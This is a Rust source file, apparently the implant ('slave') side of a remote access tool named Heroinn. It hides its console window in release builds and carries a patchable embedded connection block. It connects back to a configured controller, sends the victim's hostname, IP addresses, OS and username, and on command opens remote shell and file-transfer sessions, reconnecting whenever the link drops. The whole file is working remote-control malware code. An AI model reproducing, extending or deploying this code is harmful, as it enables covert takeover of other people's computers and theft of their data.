#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
use heroinn_util::{
    HEART_BEAT_TIME, HeroinnClientMsgID, HeroinnProtocol, HeroinnServerCommandID, SlaveDNA,
    cur_timestamp_secs,
    dna::CONNECTION_INFO_FLAG,
    packet::{Heartbeat, HostInfo, Message},
    protocol::Transport,
    session::{ClientSession, SessionBase, SessionManager},
};
use std::sync::atomic::Ordering::Relaxed;
use std::{
    str::FromStr,
    sync::{Arc, LazyLock, Mutex, atomic::AtomicU64, mpsc::channel},
    time::Duration,
};
use systemstat::{Ipv4Addr, Platform, System};
use uuid::Uuid;

mod config;
mod module;

use module::shell::ShellClient;

use crate::{config::master_configure, module::ftp::FtpClient};

const G_CONNECTION_INFO: SlaveDNA = SlaveDNA {
    flag: CONNECTION_INFO_FLAG,
    size: [0u8; 8],
    data: [0u8; 1024],
};

static G_OUT_BYTES: LazyLock<Arc<AtomicU64>> = LazyLock::new(|| Arc::new(AtomicU64::new(0)));
static G_IN_BYTES: LazyLock<Arc<AtomicU64>> = LazyLock::new(|| Arc::new(AtomicU64::new(0)));
// Kept behind a static so the compiler cannot inline G_CONNECTION_INFO into the code.
static G_DNA: LazyLock<SlaveDNA> = LazyLock::new(|| G_CONNECTION_INFO);

fn main() {
    #[cfg(debug_assertions)]
    {
        simplelog::CombinedLogger::init(vec![
            simplelog::TermLogger::new(
                log::LevelFilter::Warn,
                simplelog::Config::default(),
                simplelog::TerminalMode::Mixed,
                simplelog::ColorChoice::Auto,
            ),
            simplelog::WriteLogger::new(
                log::LevelFilter::Info,
                simplelog::Config::default(),
                std::fs::File::create("my_rust_binary.log").unwrap(),
            ),
        ])
        .unwrap();
    }

    let clientid = Uuid::new_v4().to_string();

    let shell_session_mgr: SessionManager<ShellClient> = SessionManager::new();
    let shell_session_mgr = Arc::new(Mutex::new(shell_session_mgr));

    let ftp_session_mgr: SessionManager<FtpClient> = SessionManager::new();
    let ftp_session_mgr = Arc::new(Mutex::new(ftp_session_mgr));

    let shell_session_mgr_1 = shell_session_mgr.clone();
    let ftp_session_mgr_1 = ftp_session_mgr.clone();
    std::thread::spawn(move || loop {
        std::thread::sleep(Duration::from_secs(HEART_BEAT_TIME));
        let mut shell_session = shell_session_mgr_1.lock().unwrap();
        let mut ftp_session = ftp_session_mgr_1.lock().unwrap();

        log::info!("shell session : {}", shell_session.count());
        log::info!("ftp session : {}", ftp_session.count());

        shell_session.gc();
        ftp_session.gc();
    });

    let config = master_configure();

    log::debug!("master config : {:?}", config);

    loop {
        shell_session_mgr.lock().unwrap().close_all();
        ftp_session_mgr.lock().unwrap().close_all();

        let (session_sender, session_receiver) = channel::<SessionBase>();

        let proto = match HeroinnProtocol::try_from(config.protocol) {
            Ok(p) => p,
            Err(e) => {
                log::error!("unknown protocol {} : {}", config.protocol, e);
                std::process::exit(0);
            }
        };

        let mut client = match Transport::connect(&proto, &config.address) {
            Ok(p) => p,
            Err(e) => {
                log::info!("connect failed : {}", e);
                std::thread::sleep(Duration::from_secs(5));
                continue;
            }
        };

        log::info!("connect success!");

        let hostname = whoami::hostname().unwrap_or_else(|_| "UNKNOWN".to_string());

        let sys = System::new();
        let ips = match sys.networks() {
            Ok(netifs) => {
                let mut ret = String::new();
                for netif in netifs.values() {
                    for i in &netif.addrs {
                        if let systemstat::IpAddr::V4(p) = i.addr {
                            if p == Ipv4Addr::from_str("127.0.0.1").unwrap() {
                                continue;
                            }
                            ret += &format!("{},", p);
                        }
                    }
                }
                ret
            }
            Err(_) => "UNKNOW".to_string(),
        };

        let info = os_info::get();
        let os = format!("{} {} {}", info.os_type(), info.bitness(), info.version());

        let hostinfo = HostInfo {
            ip: ips,
            host_name: hostname,
            os,
            whoami: whoami::username().unwrap_or_else(|_| "UNKNOWN".to_string()),
            remark: config.remark.clone(),
        };

        let buf = match Message::build(HeroinnClientMsgID::HostInfo.to_u8(), &clientid, hostinfo) {
            Ok(p) => p,
            Err(e) => {
                log::error!("make HostInfo packet failed : {}", e);
                client.close();
                continue;
            }
        };

        if let Err(e) = client.send(&buf) {
            log::error!("send HostInfo packet failed : {}", e);
            client.close();
            continue;
        };

        let (sender, receriver) = channel::<Vec<u8>>();

        let mut client_1 = client.clone();
        std::thread::spawn(move || loop {
            let buf = match receriver.recv() {
                Ok(p) => p,
                Err(e) => {
                    log::info!("sender channel closed : {}", e);
                    break;
                }
            };

            G_OUT_BYTES.fetch_add(buf.len() as u64, Relaxed);

            if let Err(e) = client_1.send(&buf) {
                log::info!("sender channel closed : {}", e);
                client_1.close();
                break;
            };
            log::info!("id : {} send [{}] bytes", buf[0], buf.len());
        });

        let mut client_2 = client.clone();
        let clientid_1 = clientid.clone();
        let sender_1 = sender.clone();
        std::thread::spawn(move || {
            loop {
                // Flush the in/out transfer rates accumulated since the last beat.
                let in_rate = G_IN_BYTES.load(Relaxed);
                let out_rate = G_OUT_BYTES.load(Relaxed);

                G_IN_BYTES.store(0, Relaxed);
                G_OUT_BYTES.store(0, Relaxed);

                let heartbeat = Heartbeat {
                    time: cur_timestamp_secs(),
                    in_rate,
                    out_rate,
                };
                log::info!("inrate : {} , outrate : {}", in_rate, out_rate);
                let buf = match Message::build(
                    HeroinnClientMsgID::Heartbeat.to_u8(),
                    &clientid_1,
                    heartbeat,
                ) {
                    Ok(p) => p,
                    Err(e) => {
                        log::error!("make Heartbeat packet failed : {}", e);
                        break;
                    }
                };

                if let Err(e) = sender_1.send(buf) {
                    log::error!("send Heartbeat packet to channel failed : {}", e);
                    break;
                };

                std::thread::sleep(Duration::from_secs(HEART_BEAT_TIME));
            }
            client_2.close();
        });

        std::thread::spawn(move || loop {
            let base = match session_receiver.recv() {
                Ok(p) => p,
                Err(e) => {
                    log::info!("session receiver channel closed : {}", e);
                    break;
                }
            };

            let Ok(buf) = Message::build(
                HeroinnClientMsgID::SessionPacket.to_u8(),
                &base.clientid,
                base.packet,
            ) else {
                continue;
            };

            if let Err(e) = sender.send(buf) {
                log::info!("session receiver closed : {}", e);
                break;
            };
        });

        loop {
            let buf = match client.recv() {
                Ok(buf) => buf,
                Err(e) => {
                    log::error!("connection recv failed : {}", e);
                    client.close();
                    break;
                }
            };

            G_IN_BYTES.fetch_add(buf.len() as u64, Relaxed);
            log::info!("recv [{}] bytes", buf.len());

            let command = buf
                .first()
                .and_then(|id| HeroinnServerCommandID::try_from(*id).ok());

            let msg = match Message::new(client.local_addr().unwrap(), proto.clone(), &buf) {
                Ok(p) => p,
                Err(e) => {
                    log::error!("decode server command failed : {}", e);
                    continue;
                }
            };

            match command {
                Some(HeroinnServerCommandID::Shell) => {
                    log::debug!("create shell session");
                    let id = match msg.parse_sessionpacket() {
                        Ok(p) => p.id,
                        Err(e) => {
                            log::error!("create shell session failed : {}", e);
                            continue;
                        }
                    };

                    match ShellClient::new_client(session_sender.clone(), &clientid, &id) {
                        Ok(session) => shell_session_mgr.lock().unwrap().register(session),
                        Err(e) => log::error!("create shell session failed : {}", e),
                    }
                }
                Some(HeroinnServerCommandID::File) => {
                    let id = msg.parse_sessionpacket().unwrap().id;

                    match FtpClient::new_client(session_sender.clone(), &clientid, &id) {
                        Ok(session) => ftp_session_mgr.lock().unwrap().register(session),
                        Err(e) => log::error!("create ftp session failed : {}", e),
                    }
                }
                Some(HeroinnServerCommandID::SessionPacket) => {
                    let packet = msg.parse_sessionpacket().unwrap();

                    log::info!("recv session packet [{}] [{}]", packet.id, msg.length());

                    shell_session_mgr
                        .lock()
                        .unwrap()
                        .write(&packet.id, &packet.data)
                        .unwrap();
                    ftp_session_mgr
                        .lock()
                        .unwrap()
                        .write(&packet.id, &packet.data)
                        .unwrap();
                }
                None => {}
            }
        }
    }
}
